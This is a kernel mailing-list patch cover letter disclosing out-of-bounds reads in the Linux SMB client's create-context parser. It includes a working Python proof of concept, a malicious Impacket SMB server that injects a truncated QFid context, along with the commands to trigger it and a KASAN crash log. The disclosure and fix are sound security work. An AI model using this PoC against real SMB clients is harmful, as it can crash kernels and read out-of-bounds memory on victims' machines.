Received: from mail-pf1-f170.google.com (mail-pf1-f170.google.com [209.85.210.170])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id A803A31B80E
	for <linux-cifs@vger.kernel.org>; Sun, 23 Aug 2026 16:06:39 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=209.85.210.170
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1787501201; cv=none; b=FT8gaUKG19HKPRHNKYsHQAB3TWEurvyi2VruunSn8ugCDLae1pOsHFxSXrObOqxfbDkL4BEYLiR+XZWOWZFEc+qbrF/WIP4JsZsTPBMWL2j7VZxYE07FTs65eVn4j+YVYdcsInZq/SrVYegMLYF+LT4F65/kDZzeeVYl5AJMZTI=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1787501201; c=relaxed/simple;
	bh=6bl127qNfw+TJWfNvTEiqwNSHO7f9c2NDPF/LvLIG6s=;
	h=From:To:Cc:Subject:Date:Message-ID:MIME-Version; b=sCzDWwBkQKstqusDHunm0igeDQXVmbC4nF4gP/amh+8/RkB3t9+TfyXWznnYnY+d8dJi7AvwDKmHmJNhZrTX4owfP8kxd6512VQSkpXky5gDzBbJ+NjdFTv4XbZxf7hkn5cT8/uX+Va8zWszIUEYglOJmNjOsaTJgfRzbPObMOk=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai; spf=pass smtp.mailfrom=nebusec.ai; dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b=IUx2YXmK; arc=none smtp.client-ip=209.85.210.170
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b="IUx2YXmK"
Received: by mail-pf1-f170.google.com with SMTP id d2e1a72fcca58-84862b0d5f8so1806639b3a.3
        for <linux-cifs@vger.kernel.org>; Sun, 23 Aug 2026 09:06:39 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=nebusec.ai; s=google; t=1787501199; x=1788105999; darn=vger.kernel.org;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:from:to:cc:subject:date:message-id:reply-to:content-type;
        bh=DDJPdH3qZiki+wkgiPv46KDoTZCRNmHou/1qwhyRIDA=;
        b=IUx2YXmK5RS6CsW7ffoMhCiQpjgqgK08Cm2RKSZ12SvDvxQ5Ku7V545W8hA2GqcyEJ
         8V1c3MCQO9LrBO5g8Qw9b6UW6LJtktNFMNl57MFTEIeAeS05VVrvcckDGyAmSo762oEF
         hrA7Xk/rlGAz6esiyH9kuOWgq+B/UgaOlshAva9RgQhg1f3caa0F86QK9c+OVevju+ne
         2SACZAQDH5+fK2iNpd9jNEJzWn061gHNcZzQhR3xgY4aTYyCSDuW2kgxCT6jK5GpBakh
         gOTD0/cBFi/W2RA1GrTG5NJCY0VIlcJcjEKKJjbTUg/5nT8yXIu/F7riMgSCaB/oJ5+x
         0mOQ==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20251104; t=1787501199; x=1788105999;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
         :message-id:reply-to:content-type;
        bh=DDJPdH3qZiki+wkgiPv46KDoTZCRNmHou/1qwhyRIDA=;
        b=frcX3Wz2skhlEZcwTrrgyXev8QCOvYgreqQyj+tA0Zw1lQ7wKQsijqcGzs1lfJSAct
         nRUDBdLi/RL28SrtsTwBQpsCa5SzmZRfsWcGWh/SDxnUwlOFbGUzc5Wabs0ANIeYjSOC
         e1vhOeSdsyGoSNEjb0IWYo+ohjITuiJHMdFJF0iqceT5dfd9dqnKSo4yPVe0wjmou2d5
         VNceblUsrO5irB//10uJ29iy0yB5QAas1O2dA9belI7WGDhvz5N9g6EyTOLni5qJbd1S
         KYBwYVy+JLZ3sJcPqkTEE5ndLs7WaWzzkCnuuL0hCiWxAmQUenWDGJmEiLGqZkmhw5Ik
         yy+g==
X-Gm-Message-State: AFuF++nDsOuUtDp8cD2DwfZu9rPtmEVpRjByrcnstc3aC4jskdWeXr0d
	8wuLjaSJM/GkiOl7+x6fIg8t5irIhys0WwfORhsKtGsR6GphsNb599x6gkyLxkXGilUt
X-Gm-Gg: AR+sD11tNXVpjxsy3rX8eqcp9NZSJr5BWbxNnajs6UpWP0nP/qvI+NkBDJmfONfjmf/
	S++H+589WNkhySC17jQNuw+Wc+h/jstLUC9WlTCBJE2VzLIWG0PpKDm+0xB/RqQDk3R/GHVLv1N
	vr77Azi/MpKLtc4blvjyNSq9Iju7KREUoRZxbkVRcQPtAx00nuyQ6d8ULnFji3+w/ZIOd5S9Kdu
	lv6mRuYYoQoOTnvSa1YUZiDEkTM58fyD1ZBHYyjJ6Er1Ckz1CA/WmlFnJDl0OOoW5hioji+3kkM
	XMcuajtNvfvch4ShHotN4DGE3mDRI2w2MoTStgDiBCtGySvrw7MK+JJVjs00Qx1+WiOtLaQFSgV
	8sLTe68IWhJwtHgPLRZXWeY1HlwuXyqIzKl26TbP32sdhKnBw4ijxazYW0Fe85yNYWCoolBL9Wb
	u47Xdy5HHSPvUSS83cpS/6mJS8bpa4UYyWh6SxyW0SBKM+9iRToBQuqbfiS/x7rVvI+hbawfzPq
	MhWoGKM/pF/VqM=
X-Received: by 2002:a05:6a00:2da0:b0:848:2c5e:305e with SMTP id d2e1a72fcca58-851f987d42fmr32737635b3a.6.1787501198646;
        Sun, 23 Aug 2026 09:06:38 -0700 (PDT)
Received: from gmail.com ([115.199.218.100])
        by smtp.gmail.com with ESMTPSA id d2e1a72fcca58-8520f14a418sm1211724b3a.47.2026.08.23.09.06.34
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Sun, 23 Aug 2026 09:06:38 -0700 (PDT)
From: Zihan Xi <zihanx@nebusec.ai>
To: Steve French <sfrench@samba.org>
Cc: linux-cifs@vger.kernel.org,
	samba-technical@lists.samba.org,
	linux-kernel@vger.kernel.org,
	Paulo Alcantara <pc@manguebit.org>,
	Ronnie Sahlberg <ronniesahlberg@gmail.com>,
	Shyam Prasad N <sprasad@microsoft.com>,
	Tom Talpey <tom@talpey.com>,
	Bharath SM <bharathsm@microsoft.com>,
	Pavel Shilovsky <pshilovsky@samba.org>,
	Aurelien Aptel <aaptel@suse.com>
Subject: [PATCH v2 0/2] smb: client: fix create context out-of-bounds reads
Date: Sun, 23 Aug 2026 16:06:27 +0000
Message-ID: <cover.1787486936.git.zihanx@nebusec.ai>
X-Mailer: git-send-email 2.47.3
Precedence: bulk
X-Mailing-List: linux-cifs@vger.kernel.org
List-Id: <linux-cifs.vger.kernel.org>
List-Subscribe: <mailto:linux-cifs+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:linux-cifs+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
Content-Transfer-Encoding: 8bit

Hi Linux kernel maintainers,

We found and validated a issue in fs/smb/client/smb2pdu.c. The bug is
reachable by a non-root user via user and net namespace.
We've tested it, and it should not affect any other functionality.
The malicious server can be operated by a non-root user in a user and net
namespace. The guest-side CIFS mount in this validation is performed as root
because CIFS does not set FS_USERNS_MOUNT.

We will provide detailed information about the bug
in this email, along with a PoC to trigger it.

---- details below ----

Bug details:

smb2_parse_contexts() validates the overall create-context area but must
also keep each context record within its Next-delimited boundary before
calling a handler. The QFid handler previously read a full response
structure even when DataLength covered no payload. The lease handler also
reads LeaseFlags after LeaseState, so the minimum record length must reach
the end of LeaseFlags. Finally, parse_posix_ctxt() reads three fixed-width
fields before checking that the POSIX context contains them.

This v2 series bounds each context by Next, validates QFid payload length,
extends the SMB2 lease minimum through LeaseFlags, and adds a handler-level
minimum check for the three fixed POSIX fields. The POSIX check preserves
the existing soft-failure behavior for malformed optional metadata.

Please accept my apologies for the delay. I had prepared the v2 patch
earlier, but I was busy at the time and inadvertently forgot to send it.
The v1 link is included once in the v2 change summary below.

changes in v2:
  - Bound each response context by Next and reject malformed chains.
  - Read QFid DiskFileId only when DataLength covers the payload.
  - Extend the SMB2 lease minimum through the LeaseFlags field.
  - Add a POSIX handler check for the three fixed fields.
  - v1 Link: https://lore.kernel.org/all/eb1bc35611f91bd10a4772400b37fac26f660956.1782579150.git.xizh2024@lzu.edu.cn/

Fixes history follows the separate root causes: the pre-existing Next/lease
parser path and the later QFid path are listed in patch 1, while patch 2
points to the original POSIX create-context parser introduction.

The reproducer uses an Impacket SMB server that modifies the SMB2 CREATE
response. packetdrill is not used because it cannot provide the required
stateful SMB server behavior or perform this server-side response rewrite.

Reproducer:

    ./poc.sh

Host (malicious SMB server, unprivileged user/net namespace):

    unshare -Urn ./poc.sh

Guest (KASAN kernel, root):

    mount -t cifs //10.0.2.2/SHARE /mnt/test -o user=,password=,vers=2.0,sec=ntlmssp,port=4445,noperm,soft
    cat /mnt/test/probe >/dev/null

The wrapper creates a local virtual environment and installs Impacket when
needed before running poc.py.

We run the PoC in a 2 vCPU, 2 GB RAM x86 QEMU environment.

------BEGIN poc.sh------
#!/bin/bash
set -euo pipefail

SCRIPT_DIR=$(cd -- "$(dirname -- "${BASH_SOURCE[0]}")" && pwd)
VENV_DIR="$SCRIPT_DIR/.venv-impacket"

if [[ ! -x "$VENV_DIR/bin/python" ]]; then
    python3 -m venv "$VENV_DIR"
    "$VENV_DIR/bin/pip" install impacket
fi

exec "$VENV_DIR/bin/python" "$SCRIPT_DIR/poc.py" "$@"
------END poc.sh--------

------BEGIN poc.py------
#!/usr/bin/env python3
import logging
import signal
import struct
from pathlib import Path

from impacket import smbserver
from impacket import smb3structs as smb2
from impacket.nt_errors import STATUS_SUCCESS


PORT = 4445
SHARE_NAME = "SHARE"
TARGET_NAME = "probe"
TARGET_OFFSET = 424
CONTEXT = struct.pack("<IHHHHI4s4x", 0, 16, 4, 0, 24, 0, b"QFid")
ALIGN_PAD = b"\x00" * (TARGET_OFFSET - 152)


def prepare_share(share_dir: Path) -> None:
    share_dir.mkdir(parents=True, exist_ok=True)
    (share_dir / "placeholder").touch()
    (share_dir / TARGET_NAME).write_bytes(b"x")


def main() -> None:
    base_dir = Path(__file__).resolve().parent
    share_dir = base_dir / "share"
    prepare_share(share_dir)

    logging.basicConfig(level=logging.INFO, format="%(levelname)s:%(message)s")

    original = smbserver.SMB2Commands.smb2Create

    def malicious_smb2_create(conn_id, smb_server, recv_packet):
        req = smb2.SMB2Create(recv_packet["Data"])
        raw_name = req["Buffer"][: req["NameLength"]]
        name = smbserver.normalize_path(raw_name.decode("utf-16le"))

        commands, packets, error = original(conn_id, smb_server, recv_packet)
        print(f"CREATE name={name!r} err=0x{error:08x}", flush=True)

        if error == STATUS_SUCCESS and name == TARGET_NAME:
            resp = commands[0]
            resp["CreateContextsOffset"] = TARGET_OFFSET
            resp["CreateContextsLength"] = len(CONTEXT)
            resp["AlignPad"] = ALIGN_PAD
            resp["Buffer"] = CONTEXT
            print(
                f"injected truncated QFid context; packet_len={64 + len(resp.getData())}",
                flush=True,
            )

        return commands, packets, error

    smbserver.SMB2Commands.smb2Create = staticmethod(malicious_smb2_create)

    server = smbserver.SimpleSMBServer(listenAddress="0.0.0.0", listenPort=PORT)
    server.setSMB2Support(True)
    server.addShare(SHARE_NAME, str(share_dir), readOnly="yes")
    server.setLogFile("/dev/stdout")

    print(f"Serving //10.0.2.2/{SHARE_NAME} on tcp/{PORT}", flush=True)
    print("Trigger file: probe", flush=True)

    signal.signal(signal.SIGTERM, lambda _sig, _frame: (_ for _ in ()).throw(SystemExit(0)))
    try:
        server.start()
    except (KeyboardInterrupt, SystemExit):
        pass


if __name__ == "__main__":
    main()
------END poc.py--------

The following crash excerpt is from the decoded output generated by
scripts/decode_stacktrace.sh with the matching vmlinux and source tree.

----BEGIN crash log----
[   12.012483] ==================================================================
[   12.013639] BUG: KASAN: slab-out-of-bounds in smb2_parse_contexts (fs/smb/client/smb2pdu.c:2385 fs/smb/client/smb2pdu.c:2473)
[   12.014787] Read of size 8 at addr ffff88800d564c00 by task cat/234
[   12.015758] 
[   12.016034] CPU: 1 UID: 0 PID: 234 Comm: cat Not tainted 7.2.0-rc7-00001-g9ca668da8e4c #2 PREEMPT(lazy) 
[   12.016038] Hardware name: QEMU Ubuntu 24.04 PC v2 (i440FX + PIIX, arch_caps fix, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
[   12.016040] Call Trace:
[   12.016043]  <TASK>
[   12.016044]  dump_stack_lvl (lib/dump_stack.c:94 lib/dump_stack.c:120)
[   12.016050]  print_report (mm/kasan/report.c:378 mm/kasan/report.c:482)
[   12.016054]  ? __pfx__raw_spin_lock_irqsave (include/asm-generic/qrwlock.h:122 (discriminator 4))
[   12.016058]  ? smb2_parse_contexts (fs/smb/client/smb2pdu.c:2385 fs/smb/client/smb2pdu.c:2473)
[   12.016060]  kasan_report (mm/kasan/report.c:595)
[   12.016062]  ? smb2_parse_contexts (fs/smb/client/smb2pdu.c:2385 fs/smb/client/smb2pdu.c:2473)
[   12.016064]  smb2_parse_contexts (fs/smb/client/smb2pdu.c:2385 fs/smb/client/smb2pdu.c:2473)
[   12.016067]  SMB2_open (fs/smb/client/smb2pdu.c:3388)
[   12.016069]  ? cifsConvertToUTF16 (fs/smb/client/cifs_unicode.c:567)
[   12.016072]  ? kfree (include/linux/kasan.h:235 mm/slub.c:2677 mm/slub.c:6377 mm/slub.c:6692)
[   12.016076]  ? __pfx_SMB2_open (fs/smb/client/smb2pdu.c:3281)
[   12.016078]  ? __kmalloc_noprof (include/linux/kasan.h:263 mm/slub.c:5334 mm/slub.c:5359)
[   12.016081]  ? cifs_strndup_to_utf16 (fs/smb/client/cifs_unicode.c:628 (discriminator 1))
[   12.016084]  ? cifs_convert_path_to_utf16 (fs/smb/client/smb2misc.c:510)
[   12.016087]  ? __pfx_cifs_convert_path_to_utf16 (fs/smb/client/smb2misc.c:489)
[   12.016091]  ? smb2_open_file (fs/smb/client/smb2file.c:203)
[   12.016094]  smb2_open_file (fs/smb/client/smb2file.c:203)
[   12.016097]  ? __pfx_smb2_open_file (fs/smb/client/smb2file.c:78)
[   12.016099]  ? __pfx__raw_spin_lock (include/asm-generic/qrwlock.h:87)
[   12.016102]  ? __asan_memcpy (mm/kasan/shadow.c:106 (discriminator 1))
[   12.016106]  cifs_open (fs/smb/client/file.c:613 fs/smb/client/file.c:1154)
[   12.016109]  ? kasan_save_stack (mm/kasan/common.c:57)
[   12.016112]  ? __pfx_cifs_open (fs/smb/client/file.c:985)
[   12.016119]  ? kasan_save_track (mm/kasan/common.c:78)
[   12.016122]  ? _raw_spin_lock_irqsave (include/linux/instrumented.h:55 include/linux/atomic/atomic-instrumented.h:1301 include/asm-generic/qspinlock.h:111 include/linux/spinlock.h:187 include/linux/spinlock_api_smp.h:133 kernel/locking/spinlock.c:166)
[   12.016131]  ? __pfx_lockref_get (??:?)
[   12.016137]  ? __pfx_cifs_open (fs/smb/client/file.c:985)
[   12.016142]  ? do_dentry_open (fs/open.c:947)
[   12.016146]  do_dentry_open (fs/open.c:947)
[   12.016152]  vfs_open (fs/open.c:1052)
[   12.016157]  path_openat (fs/namei.c:4700 fs/namei.c:4863)
[   12.016164]  ? __pfx_path_openat (fs/namei.c:4805)
[   12.016169]  do_file_open (fs/namei.c:4892)
[   12.016173]  ? __pfx_do_file_open (fs/namei.c:4618)
[   12.016196]  ? alloc_fd (include/linux/spinlock.h:390 fs/file.c:610)
[   12.016203]  ? do_getname (fs/namei.c:198)
[   12.016207]  do_sys_openat2 (fs/open.c:1368 (discriminator 1))
[   12.016213]  ? __pfx_do_sys_openat2 (fs/open.c:1257)
[   12.016217]  ? __pfx___do_sys_newfstat (fs/stat.c:456)
[   12.016224]  __x64_sys_openat (fs/open.c:1374 fs/open.c:1390 fs/open.c:1385 fs/open.c:1385)
[   12.016229]  ? __pfx___x64_sys_openat (fs/open.c:1378)
[   12.016235]  do_syscall_64 (arch/x86/entry/syscall_64.c:63 arch/x86/entry/syscall_64.c:94)
[   12.016241]  entry_SYSCALL_64_after_hwframe (arch/x86/entry/entry_64.S:121)
[   12.016247] RIP: 0033:0x7f4fe3e7f1c7
[   12.016253] Code: 25 00 00 41 00 3d 00 00 41 00 74 47 64 8b 04 25 18 00 00 00 85 c0 75 6b 44 89 e2 48 89 ee bf 9c ff ff ff b8 01 01 00 00 0f 05 <48> 3d 00 f0 ff ff 0f 87 95 00 00 00 48 8b 4c 24 28 64 48 2b 0c 25
All code
========
   0:	25 00 00 41 00       	and    $0x410000,%eax
   5:	3d 00 00 41 00       	cmp    $0x410000,%eax
   a:	74 47                	je     0x53
   c:	64 8b 04 25 18 00 00 	mov    %fs:0x18,%eax
  13:	00 
  14:	85 c0                	test   %eax,%eax
  16:	75 6b                	jne    0x83
  18:	44 89 e2             	mov    %r12d,%edx
  1b:	48 89 ee             	mov    %rbp,%rsi
  1e:	bf 9c ff ff ff       	mov    $0xffffff9c,%edi
  23:	b8 01 01 00 00       	mov    $0x101,%eax
  28:	0f 05                	syscall
  2a:*	48 3d 00 f0 ff ff    	cmp    $0xfffffffffffff000,%rax		<-- trapping instruction
  30:	0f 87 95 00 00 00    	ja     0xcb
  36:	48 8b 4c 24 28       	mov    0x28(%rsp),%rcx
  3b:	64                   	fs
  3c:	48                   	rex.W
  3d:	2b                   	.byte 0x2b
  3e:	0c 25                	or     $0x25,%al

Code starting with the faulting instruction
===========================================
   0:	48 3d 00 f0 ff ff    	cmp    $0xfffffffffffff000,%rax
   6:	0f 87 95 00 00 00    	ja     0xa1
   c:	48 8b 4c 24 28       	mov    0x28(%rsp),%rcx
  11:	64                   	fs
  12:	48                   	rex.W
  13:	2b                   	.byte 0x2b
  14:	0c 25                	or     $0x25,%al
[   12.016258] RSP: 002b:00007ffefc4f6030 EFLAGS: 00000246 ORIG_RAX: 0000000000000101
[   12.016265] RAX: ffffffffffffffda RBX: 0000561e1464f634 RCX: 00007f4fe3e7f1c7
[   12.016269] RDX: 0000000000000000 RSI: 00007ffefc4f6ede RDI: 00000000ffffff9c
[   12.016272] RBP: 00007ffefc4f6ede R08: 0000000000000001 R09: 0000000000000000
[   12.016275] R10: 0000000000000000 R11: 0000000000000246 R12: 0000000000000000
[   12.016278] R13: 00007ffefc4f6318 R14: 0000000000000000 R15: 0000000000020000
[   12.016282]  </TASK>
[   12.016285] 
[   12.065221] Allocated by task 232:
[   12.065778]  kasan_save_stack (mm/kasan/common.c:57)
[   12.066421]  kasan_save_track (mm/kasan/common.c:78)
[   12.067212]  __kasan_slab_alloc (mm/kasan/common.c:340 mm/kasan/common.c:366)
[   12.067836]  kmem_cache_alloc_noprof (include/linux/kasan.h:253 mm/slub.c:4584 mm/slub.c:4917 mm/slub.c:4931)
[   12.069428]  mempool_alloc_noprof (mm/mempool.c:559)
[   12.070177]  cifs_small_buf_get (fs/smb/client/misc.c:237 (discriminator 2))
[   12.070797]  allocate_buffers (fs/smb/client/connect.c:659)
[   12.071430]  cifs_demultiplex_thread (fs/smb/client/connect.c:1281)
[   12.072170]  kthread (kernel/kthread.c:436)
[   12.072778]  ret_from_fork (arch/x86/kernel/process.c:158)
[   12.073592]  ret_from_fork_asm (arch/x86/entry/entry_64.S:245)
[   12.074318] 
[   12.074646] The buggy address belongs to the object at ffff88800d564a40
[   12.074646]  which belongs to the cache cifs_small_rq of size 448
[   12.076729] The buggy address is located 0 bytes to the right of
[   12.076729]  allocated 448-byte region [ffff88800d564a40, ffff88800d564c00)
[   12.079436] 
[   12.079712] The buggy address belongs to the physical page:
[   12.080845] page: refcount:0 mapcount:0 mapping:0000000000000000 index:0xffff88800d5651c0 pfn:0xd564
[   12.082977] head: order:1 mapcount:0 entire_mapcount:0 nr_pages_mapped:0 pincount:0
[   12.084130] flags: 0x100000000000240(workingset|head|node=0|zone=1)
[   12.085595] page_type: f5(slab)
[   12.086420] raw: 0100000000000240 ffff8880026459c0 ffff888002ca6e50 ffff888002ca6e50
[   12.087847] raw: ffff88800d5651c0 00000000000c0007 00000000f5000000 0000000000000000
[   12.089515] head: 0100000000000240 ffff8880026459c0 ffff888002ca6e50 ffff888002ca6e50
[   12.090958] head: ffff88800d5651c0 00000000000c0007 00000000f5000000 0000000000000000
[   12.092304] head: 0100000000000001 ffffffffffffff81 00000000ffffffff 00000000ffffffff
[   12.094665] head: 0000000000000000 0000000000000000 00000000ffffffff 0000000000000000
[   12.095841] page dumped because: kasan: bad access detected
[   12.097003] 
[   12.097835] Memory state around the buggy address:
[   12.099253]  ffff88800d564b00: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
[   12.100390]  ffff88800d564b80: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
[   12.102134] >ffff88800d564c00: fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc
[   12.103515]                    ^
[   12.104394]  ffff88800d564c80: fc fc fc fc fc fc fc fc 00 00 00 00 00 00 00 00
[   12.105856]  ffff88800d564d00: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
[   12.107468] ==================================================================
[   12.110319] Kernel panic - not syncing: KASAN: panic_on_warn set ...
[   12.112041] CPU: 1 UID: 0 PID: 234 Comm: cat Not tainted 7.2.0-rc7-00001-g9ca668da8e4c #2 PREEMPT(lazy) 
[   12.113570] Hardware name: QEMU Ubuntu 24.04 PC v2 (i440FX + PIIX, arch_caps fix, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
[   12.116267] Call Trace:
[   12.116691]  <TASK>
[   12.117097]  vpanic (kernel/panic.c:651)
[   12.117667]  ? __pfx_vpanic (kernel/panic.c:362)
[   12.118611]  ? preempt_schedule_irq (kernel/sched/core.c:7556)
[   12.120045]  ? smb2_parse_contexts (fs/smb/client/smb2pdu.c:2385 fs/smb/client/smb2pdu.c:2473)
[   12.120831]  panic (kernel/panic.c:788)
[   12.121342]  ? __pfx_panic (kernel/panic.c:742)
[   12.121990]  check_panic_on_warn (kernel/panic.c:525 kernel/panic.c:520)
[   12.122652]  end_report (mm/kasan/report.c:227)
[   12.123305]  kasan_report (mm/kasan/report.c:597)
[   12.124037]  ? smb2_parse_contexts (fs/smb/client/smb2pdu.c:2385 fs/smb/client/smb2pdu.c:2473)
[   12.124851]  smb2_parse_contexts (fs/smb/client/smb2pdu.c:2385 fs/smb/client/smb2pdu.c:2473)
[   12.125619]  SMB2_open (fs/smb/client/smb2pdu.c:3388)
[   12.126257]  ? cifsConvertToUTF16 (fs/smb/client/cifs_unicode.c:567)
[   12.127035]  ? kfree (include/linux/kasan.h:235 mm/slub.c:2677 mm/slub.c:6377 mm/slub.c:6692)
[   12.127765]  ? __pfx_SMB2_open (fs/smb/client/smb2pdu.c:3281)
[   12.128403]  ? __kmalloc_noprof (include/linux/kasan.h:263 mm/slub.c:5334 mm/slub.c:5359)
[   12.129117]  ? cifs_strndup_to_utf16 (fs/smb/client/cifs_unicode.c:628 (discriminator 1))
[   12.129863]  ? cifs_convert_path_to_utf16 (fs/smb/client/smb2misc.c:510)
[   12.130942]  ? __pfx_cifs_convert_path_to_utf16 (fs/smb/client/smb2misc.c:489)
[   12.134088]  ? smb2_open_file (fs/smb/client/smb2file.c:203)
[   12.136608]  smb2_open_file (fs/smb/client/smb2file.c:203)
[   12.137833]  ? __pfx_smb2_open_file (fs/smb/client/smb2file.c:78)
[   12.138800]  ? __pfx__raw_spin_lock (include/asm-generic/qrwlock.h:87)
[   12.140451]  ? __asan_memcpy (mm/kasan/shadow.c:106 (discriminator 1))
[   12.141281]  cifs_open (fs/smb/client/file.c:613 fs/smb/client/file.c:1154)
[   12.141882]  ? kasan_save_stack (mm/kasan/common.c:57)
[   12.142556]  ? __pfx_cifs_open (fs/smb/client/file.c:985)
[   12.143287]  ? kasan_save_track (mm/kasan/common.c:78)
-----END crash log-----

Best regards,
Zihan Xi

Zihan Xi (2):
  smb: client: fix create context out-of-bounds reads
  smb: client: validate POSIX create context length

 fs/smb/client/smb2pdu.c | 43 ++++++++++++++++++++++++++++++++++-------
 1 file changed, 36 insertions(+), 7 deletions(-)

-- 
2.43.0

